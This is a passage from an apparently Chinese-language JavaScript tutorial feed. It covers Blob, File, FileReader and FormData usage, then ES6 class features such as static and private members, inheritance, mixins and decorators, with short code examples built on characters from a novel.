<div><pre><code><span>const</span> blob <span>=</span> <span>new</span> <span>Blob</span><span>(</span><span>[</span><span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>{</span> <span>name</span><span>:</span> <span>'Neo'</span> <span>}</span><span>,</span> <span>null</span><span>,</span> <span>2</span><span>)</span><span>]</span><span>,</span> <span>{</span>
  <span>type</span><span>:</span> <span>'application/json'</span><span>,</span>
<span>}</span><span>)</span>

<span>download</span><span>(</span>blob<span>)</span>

<span>function</span> <span>download</span><span>(</span><span>blob</span><span>)</span> <span>{</span>
  <span>const</span> url <span>=</span> window<span>.</span><span>URL</span><span>.</span><span>createObjectURL</span><span>(</span>blob<span>)</span>
  <span>const</span> a <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>'a'</span><span>)</span>
  a<span>.</span>href <span>=</span> url
  a<span>.</span>download <span>=</span> <span>'Matrix.json'</span>
  a<span>.</span><span>click</span><span>(</span><span>)</span>
  window<span>.</span><span>URL</span><span>.</span><span>revokeObjectURL</span><span>(</span>url<span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div></li>
</ul>
<h2 id="_14-file"> 14. File</h2>
<ul>
<li>
<p>基于 Blob，继承了 blob 的功能并将其扩展使其支持用户系统上的文件。</p>
<div><pre><code><span>new</span> <span>File</span><span>(</span><span>[</span><span>'clearlove7'</span><span>]</span><span>,</span> <span>'EDG.txt'</span><span>,</span> <span>{</span> <span>type</span><span>:</span> <span>'text/plain'</span> <span>}</span><span>)</span> <span>// => {name: 'EDG.txt', lastModified: 1635493540169, lastModifiedDate: Fri Oct 29 2021 15:45:40 GMT+0800 (中国标准时间), webkitRelativePath: '', size: 10, type: "text/plain", webkitRelativePath: ""}</span>

<span>// Blob 转 File</span>
<span>new</span> <span>File</span><span>(</span><span>[</span>blob<span>]</span><span>,</span> <span>'Matrix.json'</span><span>,</span> <span>{</span> <span>type</span><span>:</span> blob<span>.</span>type <span>}</span><span>)</span>
<span>// ArrayBuffer 转 File</span>
<span>new</span> <span>File</span><span>(</span><span>[</span>buffer<span>]</span><span>,</span> <span>'Matrix.json'</span><span>,</span> <span>{</span> <span>type</span><span>:</span> <span>'application/json'</span> <span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div></li>
<li>
<p>Base64 转 File。</p>
<div><pre><code><span>function</span> <span>dataUrl2File</span><span>(</span><span>dataUrl</span><span>)</span> <span>{</span>
  <span>let</span> ary <span>=</span> dataUrl<span>.</span><span>split</span><span>(</span><span>','</span><span>)</span><span>,</span>
    mime <span>=</span> ary<span>[</span><span>0</span><span>]</span><span>.</span><span>match</span><span>(</span><span><span>/</span><span>:(.*?);</span><span>/</span></span><span>)</span><span>[</span><span>1</span><span>]</span><span>,</span>
    base64 <span>=</span> <span>atob</span><span>(</span>ary<span>[</span><span>1</span><span>]</span><span>)</span><span>,</span>
    n <span>=</span> base64<span>.</span>length<span>,</span>
    u8ary <span>=</span> <span>new</span> <span>Uint8Array</span><span>(</span>n<span>)</span>
  <span>while</span> <span>(</span>n<span>--</span><span>)</span> u8ary<span>[</span>n<span>]</span> <span>=</span> base64<span>.</span><span>charCodeAt</span><span>(</span>n<span>)</span>
  <span>return</span> <span>new</span> <span>File</span><span>(</span><span>[</span>u8ary<span>]</span><span>,</span> <span>'Matrix.png'</span><span>,</span> <span>{</span> <span>type</span><span>:</span> mime <span>}</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div></li>
<li>
<p>下载 File。</p>
<div><pre><code><span>const</span> file <span>=</span> <span>new</span> <span>File</span><span>(</span>
  <span>[</span><span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>{</span> <span>name</span><span>:</span> <span>'Neo'</span> <span>}</span><span>,</span> <span>null</span><span>,</span> <span>2</span><span>)</span><span>]</span><span>,</span>
  <span>'Matrix.json'</span><span>,</span>
  <span>{</span>
    <span>type</span><span>:</span> <span>'application/json'</span><span>,</span>
  <span>}</span>
<span>)</span>

<span>download</span><span>(</span>file<span>)</span>

<span>function</span> <span>download</span><span>(</span><span>file</span><span>)</span> <span>{</span>
  <span>const</span> url <span>=</span> window<span>.</span><span>URL</span><span>.</span><span>createObjectURL</span><span>(</span>file<span>)</span>
  <span>const</span> a <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>'a'</span><span>)</span>
  a<span>.</span>href <span>=</span> url
  a<span>.</span>download <span>=</span> file<span>.</span>name
  a<span>.</span><span>click</span><span>(</span><span>)</span>
  window<span>.</span><span>URL</span><span>.</span><span>revokeObjectURL</span><span>(</span>url<span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div></li>
<li>
<p>文件切片。</p>
<div><pre><code><span>function</span> <span>section</span><span>(</span><span>file</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
    <span>let</span> fileName <span>=</span> file<span>.</span>name
        <span>.</span><span>split</span><span>(</span><span>'.'</span><span>)</span>
        <span>.</span><span>slice</span><span>(</span><span>0</span><span>,</span> <span>-</span><span>1</span><span>)</span>
        <span>.</span><span>join</span><span>(</span><span>'.'</span><span>)</span><span>,</span>
      ext <span>=</span> file<span>.</span>name<span>.</span><span>split</span><span>(</span><span>'.'</span><span>)</span><span>.</span><span>slice</span><span>(</span><span>-</span><span>1</span><span>)</span><span>[</span><span>0</span><span>]</span><span>,</span>
      chunkSize <span>=</span> <span>1024</span> <span>*</span> <span>1024</span> <span>*</span> <span>10</span><span>,</span>
      count <span>=</span> Math<span>.</span><span>ceil</span><span>(</span>file<span>.</span>size <span>/</span> chunkSize<span>)</span><span>,</span>
      n <span>=</span> <span>0</span><span>,</span>
      chunks <span>=</span> <span>[</span><span>]</span>
    <span>const</span> reader <span>=</span> <span>new</span> <span>FileReader</span><span>(</span>file<span>)</span>
    reader<span>.</span><span>readAsArrayBuffer</span><span>(</span>file<span>)</span>
    reader<span>.</span><span>onload</span> <span>=</span> <span>_</span> <span>=></span> <span>{</span>
      <span>const</span> hashName <span>=</span> <span>jsMd5</span><span>(</span>reader<span>.</span>result<span>)</span>
      <span>while</span> <span>(</span>n <span>&lt;</span> count<span>)</span> <span>{</span>
        chunks<span>.</span><span>push</span><span>(</span><span>{</span>
          <span>file</span><span>:</span> file<span>.</span><span>slice</span><span>(</span>n <span>*</span> chunkSize<span>,</span> <span>(</span>n <span>+</span> <span>1</span><span>)</span> <span>*</span> chunkSize<span>)</span><span>,</span>
          <span>name</span><span>:</span> <span><span>`</span><span><span>${</span>hashName<span>}</span></span><span>_</span><span><span>${</span>fileName<span>}</span></span><span>_</span><span><span>${</span>n <span>+</span> <span>1</span><span>}</span></span><span>.</span><span><span>${</span>ext<span>}</span></span><span>`</span></span><span>,</span>
        <span>}</span><span>)</span>
        n<span>++</span>
      <span>}</span>
      <span>resolve</span><span>(</span><span>{</span>s
        <span>name</span><span>:</span> <span><span>`</span><span><span>${</span>hashName<span>}</span></span><span>_</span><span><span>${</span>file<span>.</span>name<span>}</span></span><span>`</span></span><span>,</span>
        <span>size</span><span>:</span> file<span>.</span>size<span>,</span>
        count<span>,</span>
        chunks<span>,</span>
      <span>}</span><span>)</span>
    <span>}</span>
    reader<span>.</span><span>onerror</span> <span>=</span> <span>_</span> <span>=></span> <span>reject</span><span>(</span><span>)</span>
  <span>}</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br></div></div></li>
</ul>
<h2 id="_15-filereader"> 15. FileReader</h2>
<ul>
<li>
<p>可以异步读取文件。</p>
<blockquote>
<ul>
<li>FileReader.abort()：中断读取。</li>
<li>FileReader.readAsArrayBuffer()：result 属性返回 ArrayBuffer 数据对象，可用来修改数据生成新文件。</li>
<li>FileReader.readAsDataURL()：result 属性返回 Base64 格式数据，可用来图片转 Base64 格式。</li>
<li>FileReader.readAsText()：result 属性返回字符串表示的文本内容，可用来读取 <code>.html</code>、<code>.css</code>、<code>.js</code>、<code>.txt</code>、<code>.md</code> 等 Text 类型文件。</li>
</ul>
</blockquote>
</li>
</ul>
<div><pre><code><span>// 图片转 Base64</span>
<span>function</span> <span>picture2DataUrl</span><span>(</span><span>file</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
    <span>const</span> reader <span>=</span> <span>new</span> <span>FileReader</span><span>(</span><span>)</span>
    reader<span>.</span><span>readAsDataURL</span><span>(</span>file<span>)</span>
    reader<span>.</span><span>onload</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>resolve</span><span>(</span>reader<span>.</span>result<span>)</span>
    reader<span>.</span><span>onerror</span> <span>=</span> <span>error</span> <span>=></span> <span>reject</span><span>(</span>error<span>)</span>
  <span>}</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><h2 id="_16-formdata"> 16. FormData</h2>
<ul>
<li>通过 key/value 格式存储数据（可迭代），一般用来向后端传输文件。</li>
</ul>
<div><pre><code><span>const</span> formData <span>=</span> <span>new</span> <span>FormData</span><span>(</span><span>)</span>

<span>// 添加元素</span>
formData<span>.</span><span>append</span><span>(</span><span>'name'</span><span>,</span> <span>'徐扶墙'</span><span>)</span> <span>// => undefined</span>
formData<span>.</span><span>append</span><span>(</span><span>'age'</span><span>,</span> <span>17</span><span>)</span> <span>// => undefined</span>
formData<span>.</span><span>append</span><span>(</span>
  <span>'file'</span><span>,</span>
  <span>new</span> <span>File</span><span>(</span><span>[</span><span>'clearlove7'</span><span>]</span><span>,</span> <span>'EDG.txt'</span><span>,</span> <span>{</span> <span>type</span><span>:</span> <span>'text/plain'</span> <span>}</span><span>)</span><span>,</span>
  <span>'给后端的文件名称'</span>
<span>)</span> <span>// => undefined</span>
<span>// 若属性存在，set 会覆盖该属性的值，append 则会追加一个值</span>
formData<span>.</span><span>set</span><span>(</span><span>'name'</span><span>,</span> <span>'徐扶墙'</span><span>)</span>
<span>// 检测是否存在</span>
formData<span>.</span><span>has</span><span>(</span><span>'name'</span><span>)</span> <span>// => true</span>
<span>// 获取元素</span>
formData<span>.</span><span>get</span><span>(</span><span>'name'</span><span>)</span> <span>// => '徐扶墙'</span>
<span>// 获取指定键的所有值</span>
formData<span>.</span><span>getAll</span><span>(</span><span>'name'</span><span>)</span> <span>// => ['徐扶墙']</span>
<span>// 删除指定元素</span>
formData<span>.</span><span>delete</span><span>(</span><span>'name'</span><span>)</span> <span>// => undefined</span>
<span>// 迭代 formData</span>
<span>for</span> <span>(</span><span>const</span> <span>[</span>key<span>,</span> value<span>]</span> <span>of</span> formData<span>)</span> console<span>.</span><span>log</span><span>(</span>key<span>,</span> value<span>)</span> <span>// => 依次打印：'age' '17' -> 'file' {File对象}</span>
<span>// keys/values/entries 返回可迭代对象</span>
<span>for</span> <span>(</span><span>const</span> key <span>of</span> formData<span>.</span><span>keys</span><span>(</span><span>)</span><span>)</span> console<span>.</span><span>log</span><span>(</span>key<span>)</span> <span>// => 依次打印：'age' -> 'file'</span>
<span>for</span> <span>(</span><span>const</span> value <span>of</span> formData<span>.</span><span>values</span><span>(</span><span>)</span><span>)</span> console<span>.</span><span>log</span><span>(</span>value<span>)</span> <span>// => 依次打印：'17' -> File对象</span>
<span>for</span> <span>(</span><span>const</span> <span>[</span>key<span>,</span> value<span>]</span> <span>of</span> formData<span>.</span><span>entries</span><span>(</span><span>)</span><span>)</span> console<span>.</span><span>log</span><span>(</span>key<span>,</span> value<span>)</span> <span>// => 依次打印：'age' '17' -> 'file' {File对象}</span>
<span>// 获取第一个元素</span>
formData<span>.</span><span>keys</span><span>(</span><span>)</span><span>.</span><span>next</span><span>(</span><span>)</span><span>.</span>value <span>// => 'age'</span>
formData<span>.</span><span>values</span><span>(</span><span>)</span><span>.</span><span>next</span><span>(</span><span>)</span><span>.</span>value <span>// => '17'</span>
formData<span>.</span><span>entries</span><span>(</span><span>)</span><span>.</span><span>next</span><span>(</span><span>)</span><span>.</span>value <span>// => ['age', '17']</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Class</title>
      <link>https://www.matrixtheone.ga/web/note/js/Class/</link>
      <guid>https://www.matrixtheone.ga/web/note/js/Class/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Class</source>
      <category>JS 基础</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-class"> 1. class</h2>
<ul>
<li>
<p>ES6 的 class 可以看作只是一个语法糖，它的绝大部分功能，ES5 都可以做到，新的 class 写法只是让对象原型的写法更加清晰、更像面向对象编程的语法而已。</p>
</li>
<li>
<p>constructor 必须有，未显式定义时 JavaScript 引擎会默认添加，默认返回实例对象（this）。</p>
</li>
<li>
<p>class 声明的方法默认定义在原型链 prototype 上，不可枚举。</p>
</li>
</ul>
<div><pre><code><span>class</span> <span>XueDao</span> <span>{</span>
  wife <span>=</span> <span>'南宫仆射'</span>
  <span>constructor</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>name <span>=</span> name
    <span>this</span><span>.</span>age <span>=</span> age
  <span>}</span>
  <span>rank</span><span>(</span><span>ranking</span><span>)</span> <span>{</span>
    <span>return</span> <span><span>`</span><span>天下第</span><span><span>${</span>ranking<span>}</span></span><span><span>${</span><span>this</span><span>.</span>name<span>}</span></span><span>`</span></span>
  <span>}</span>
<span>}</span>

<span>typeof</span> XueDao <span>// => 'function'</span>

<span>const</span> xfq <span>=</span> <span>new</span> <span>XueDao</span><span>(</span><span>'徐扶墙'</span><span>,</span> <span>17</span><span>)</span> <span>// => {wife: '南宫仆射', name: '徐扶墙', age: 17}</span>

xfq<span>.</span><span>rank</span><span>(</span><span>'二'</span><span>)</span> <span>// => '天下第二徐扶墙'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><div><pre><code><span>const</span> xfq <span>=</span> <span>new</span> <span>(</span><span>class</span> <span>XueDao</span> <span>{</span>
  <span>constructor</span><span>(</span><span>name</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>name <span>=</span> name
    <span>return</span> <span>{</span><span>}</span>
  <span>}</span>
<span>}</span><span>)</span><span>(</span><span>'徐扶墙'</span><span>)</span> <span>// => {}</span>

<span>// 定义了 constructor 返回值为空对象</span>
xfq <span>instanceof</span> <span>XueDao</span> <span>// => false</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><h2 id="_2-static"> 2. static</h2>
<ul>
<li>静态属性/方法（定义在类上）。</li>
</ul>
<div><pre><code><span>class</span> <span>XueDao</span> <span>{</span>
  <span>static</span> daughter <span>=</span> <span>'柿子'</span>
  <span>constructor</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>name <span>=</span> name
    <span>this</span><span>.</span>age <span>=</span> age
  <span>}</span>
  <span>static</span> <span>rank</span><span>(</span><span>ranking</span><span>)</span> <span>{</span>
    <span>return</span> <span><span>`</span><span>天下第</span><span><span>${</span>ranking<span>}</span></span><span>徐扶墙</span><span>`</span></span>
  <span>}</span>
<span>}</span>

<span>// 与 static 等价</span>
XueDao<span>.</span>weapons <span>=</span> <span>'双刀绣冬春雷'</span>

XueDao<span>.</span>daughter <span>// => '柿子'</span>
XueDao<span>.</span><span>rank</span><span>(</span><span>'二'</span><span>)</span> <span>// => '天下第二徐扶墙'</span>
XueDao<span>.</span>weapons <span>// => '双刀绣冬春雷'</span>

<span>const</span> xfq <span>=</span> <span>new</span> <span>XueDao</span><span>(</span><span>'徐扶墙'</span><span>,</span> <span>17</span><span>)</span> <span>// => {name: '徐扶墙', age: 17}</span>
xfq<span>.</span>daughter <span>// => undefined</span>
xfq<span>.</span>rank <span>// => undefined</span>
xfq<span>.</span>weapons <span>// => undefined</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div><h2 id="_3"> 3. <code>#</code></h2>
<ul>
<li>私有属性/方法（只能在类内部访问）。</li>
</ul>
<div><pre><code><span>class</span> <span>XueDao</span> <span>{</span>
  #daughter <span>=</span> <span>'柿子'</span>
  <span>constructor</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>name <span>=</span> name
    <span>this</span><span>.</span>age <span>=</span> age
  <span>}</span>
  <span>#rank</span><span>(</span><span>ranking</span><span>)</span> <span>{</span>
    <span>return</span> <span><span>`</span><span>天下第</span><span><span>${</span>ranking<span>}</span></span><span><span>${</span><span>this</span><span>.</span>name<span>}</span></span><span>`</span></span>
  <span>}</span>
  <span>versailles</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span><span>`</span><span><span>${</span><span>this</span><span>.</span><span>#rank</span><span>(</span><span>'二'</span><span>)</span><span>}</span></span><span> -> </span><span><span>${</span><span>this</span><span>.</span>#daughter<span>}</span></span><span>`</span></span>
  <span>}</span>
<span>}</span>

XueDao<span>.</span>#daughter  <span>// => Uncaught SyntaxError</span>
XueDao<span>.</span><span>#rank</span><span>(</span><span>)</span>  <span>// => Uncaught SyntaxError</span>

<span>const</span> xfq <span>=</span> <span>new</span> <span>XueDao</span><span>(</span><span>'徐扶墙'</span><span>,</span> <span>17</span><span>)</span> <span>// => {name: '徐扶墙', age: 17, #rank: ƒ, #daughter: '柿子'}</span>
xfq<span>.</span>#daughter <span>// => Uncaught SyntaxError</span>
xfq<span>.</span><span>#rank</span><span>(</span><span>)</span> <span>// => Uncaught SyntaxError</span>
xfq<span>.</span><span>versailles</span><span>(</span><span>)</span> <span>// => '天下第二徐扶墙 -> 柿子'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div><h2 id="_4-extends"> 4. extends</h2>
<ul>
<li>
<p>通过 extends 关键字实现继承，要比 ES5 的通过修改原型链实现继承，要清晰和方便很多。</p>
</li>
<li>
<p>子类必须在 constructor 方法中调用 super 方法，否则新建实例时会报错。这是因为子类自己的 this 对象，必须先通过父类的构造函数完成塑造，得到与父类同样的实例属性和方法，然后再对其进行加工，加上子类自己的实例属性和方法。如果不调用 super 方法，子类就得不到 this 对象，必须在 super 之后才能使用 this。</p>
</li>
<li>
<p>super() 作为函数只能在子类 constructor 中使用，内部 this 指向子类实例。super 作为对象调用，在普通方法中，指向父类的原型对象；在静态方法中，指向父类（<a href="https://es6.ruanyifeng.com/#docs/class-extends#super-%E5%85%B3%E9%94%AE%E5%AD%97" target="_blank" rel="noopener noreferrer">super - 阮一峰</a>）。</p>
</li>
</ul>
<div><pre><code><span>class</span> <span>XueDao</span> <span>{</span>
  daughter <span>=</span> <span>'太监总管'</span>
  <span>constructor</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>name <span>=</span> name
    <span>this</span><span>.</span>age <span>=</span> age
  <span>}</span>
  <span>show</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span>daughter
  <span>}</span>
<span>}</span>

<span>class</span> <span>BeiLiang</span> <span>extends</span> <span>XueDao</span> <span>{</span>
  daughter <span>=</span> <span>'柿子'</span>
  <span>constructor</span><span>(</span><span>name<span>,</span> age<span>,</span> wife</span><span>)</span> <span>{</span>
    <span>super</span><span>(</span>name<span>,</span> age<span>)</span>
    <span>this</span><span>.</span>wife <span>=</span> wife
  <span>}</span>
  <span>versailles</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>super</span><span>.</span><span>show</span><span>(</span><span>)</span>
  <span>}</span>
<span>}</span>

<span>const</span> xfq <span>=</span> <span>new</span> <span>BeiLiang</span><span>(</span><span>'徐扶墙'</span><span>,</span> <span>17</span><span>,</span> <span>'南宫仆射'</span><span>)</span> <span>// => {name: '徐扶墙', age: 17, wife: '南宫仆射'}</span>
xfq<span>.</span><span>versailles</span><span>(</span><span>)</span> <span>// => '柿子'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br></div></div><h2 id="_5-mixin"> 5. Mixin</h2>
<ul>
<li>混合继承。</li>
</ul>
<div><pre><code><span>function</span> <span>mix</span><span>(</span><span><span>...</span>mixins</span><span>)</span> <span>{</span>
  <span>class</span> <span>Mix</span> <span>{</span>
    <span>constructor</span><span>(</span><span><span>...</span>args</span><span>)</span> <span>{</span>
      <span>for</span> <span>(</span><span>const</span> mixin <span>of</span> mixins<span>)</span> <span>{</span>
        <span>copyProperties</span><span>(</span><span>this</span><span>,</span> <span>new</span> <span>mixin</span><span>(</span><span>...</span>args<span>)</span><span>,</span> <span>true</span><span>)</span> <span>// 拷贝实例属性</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>

  <span>for</span> <span>(</span><span>const</span> mixin <span>of</span> mixins<span>)</span> <span>{</span>
    <span>copyProperties</span><span>(</span>Mix<span>,</span> mixin<span>)</span> <span>// 拷贝静态属性</span>
    <span>copyProperties</span><span>(</span><span>Mix</span><span>.</span>prototype<span>,</span> mixin<span>.</span>prototype<span>)</span> <span>// 拷贝原型属性</span>
  <span>}</span>

  <span>return</span> Mix
<span>}</span>

<span>function</span> <span>copyProperties</span><span>(</span><span>target<span>,</span> source<span>,</span> allowName <span>=</span> <span>false</span></span><span>)</span> <span>{</span>
  <span>const</span> excludeKeys <span>=</span> <span>[</span><span>'constructor'</span><span>,</span> <span>'prototype'</span><span>,</span> <span>'name'</span><span>]</span>
  <span>if</span> <span>(</span>allowName<span>)</span> excludeKeys<span>.</span><span>pop</span><span>(</span><span>)</span>
  <span>for</span> <span>(</span><span>const</span> key <span>of</span> Reflect<span>.</span><span>ownKeys</span><span>(</span>source<span>)</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span>excludeKeys<span>.</span><span>includes</span><span>(</span>key<span>)</span><span>)</span> <span>{</span>
      <span>const</span> desc <span>=</span> Object<span>.</span><span>getOwnPropertyDescriptor</span><span>(</span>source<span>,</span> key<span>)</span>
      Object<span>.</span><span>defineProperty</span><span>(</span>target<span>,</span> key<span>,</span> desc<span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span>

<span>class</span> <span>Foo</span> <span>{</span>
  <span>constructor</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>name <span>=</span> name
    <span>this</span><span>.</span>age <span>=</span> age
  <span>}</span>
<span>}</span>

<span>class</span> <span>Bar</span> <span>{</span>
  daughter <span>=</span> <span>'柿子'</span>
  <span>constructor</span><span>(</span><span>wife</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>wife <span>=</span> wife
  <span>}</span>
  <span>versailles</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span>daughter
  <span>}</span>
<span>}</span>

<span>class</span> <span>XueDao</span> <span>extends</span> <span>mix</span><span>(</span>Foo<span>,</span> Bar<span>)</span> <span>{</span>
  <span>rank</span><span>(</span><span>ranking</span><span>)</span> <span>{</span>
    <span>return</span> <span><span>`</span><span>天下第</span><span><span>${</span>ranking<span>}</span></span><span><span>${</span><span>this</span><span>.</span>name<span>}</span></span><span>`</span></span>
  <span>}</span>
<span>}</span>

<span>const</span> xfq <span>=</span> <span>new</span> <span>XueDao</span><span>(</span><span>'徐扶墙'</span><span>,</span> <span>17</span><span>,</span> <span>'南宫仆射'</span><span>)</span> <span>// => {name: '徐扶墙', age: 17, daughter: '柿子', wife: '徐扶墙'}</span>
xfq<span>.</span><span>rank</span><span>(</span><span>'二'</span><span>)</span> <span>// => '天下第二徐扶墙'</span>
xfq<span>.</span><span>versailles</span><span>(</span><span>)</span> <span>// => '柿子'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br></div></div><h2 id="_6"> 6. @</h2>
<ul>
<li>装饰器只能用于类，不能用于函数，因为存在函数提升（提案阶段，可搭配 babel 使用，目前很多库都已使用）。</li>
</ul>
<div><pre><code><span>import</span> <span>{</span> decoratorClass<span>,</span> readonly<span>,</span> debounce <span>}</span> <span>from</span> <span>'decorator'</span>

<span>// 装饰类</span>
@decoratorClass
<span>class</span> <span>XueDao</span> <span>{</span>
  <span>// 装饰属性</span>
  @readonly wife <span>=</span> <span>'南宫仆射'</span>
  <span>// 装饰方法</span>
  @<span>debounce</span><span>(</span><span>1000</span><span>)</span>
  <span>search</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>export</span> <span>const</span> <span>decoratorClass</span> <span>=</span> <span>_class</span> <span>=></span> <span>{</span>
  _class<span>.</span>age <span>=</span> <span>17</span>
<span>}</span>

<span>export</span> <span>const</span> <span>readonly</span> <span>=</span> <span>(</span><span>target<span>,</span> name<span>,</span> descriptor</span><span>)</span> <span>=></span> <span>{</span>
  descriptor<span>.</span>writable <span>=</span> <span>false</span>
  <span>return</span> descriptor
<span>}</span>

<span>export</span> <span>const</span> <span>debounce</span> <span>=</span> <span>wait</span> <span>=></span> <span>{</span>
  <span>const</span> <span>debounceFn</span> <span>=</span> <span>(</span><span>fn<span>,</span> ms <span>=</span> <span>500</span></span><span>)</span> <span>=></span> <span>{</span>
    <span>let</span> timeoutId
    <span>return</span> <span>function</span><span>(</span><span><span>...</span>args</span><span>)</span> <span>{</span>
      <span>clearTimeout</span><span>(</span>timeoutId<span>)</span>
      timeoutId <span>=</span> <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>fn</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> args<span>)</span><span>,</span> ms<span>)</span>
    <span>}</span>
  <span>}</span>
  <span>return</span> <span>function</span><span>(</span><span>target<span>,</span> name<span>,</span> descriptor</span><span>)</span> <span>{</span>
